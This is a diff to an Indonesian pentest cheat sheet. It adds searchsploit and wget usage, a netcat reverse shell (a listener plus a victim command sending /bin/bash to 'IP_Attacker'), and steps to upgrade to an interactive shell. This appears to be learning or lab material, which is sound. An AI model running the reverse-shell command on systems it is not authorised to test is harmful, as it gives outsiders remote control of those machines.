@@ -137,3 +137,34 @@ Searchsploit
 searchsploit linux 2.2.0
 ```
 > Mencari exploit dengan keyword tertentu contoh linux 2.2.0
+
+Mendownload (Copy) exploit ke working directory
+```
+searchsploit -m Nomor_Exploit
+```
+
+Download File
+```
+wget Alamat_URL
+```
+
+
+### Reverse shell
+Membuat Listener Pada Machine Attacker (Kali), contoh untuk port 4444
+```
+nc -nlvp 4444
+```
+Kemudian pada Victim:
+```
+nc -nv IP_Attacker Port -e /bin/bash
+```
+
+### Upgrade ke Interactive shell
+```
+python -c 'import pty;pty.spawn("/bin/bash")'
+CTRL+Z
+stty raw -echo
+fg
+<ENTER>
+<ENTER>
+```
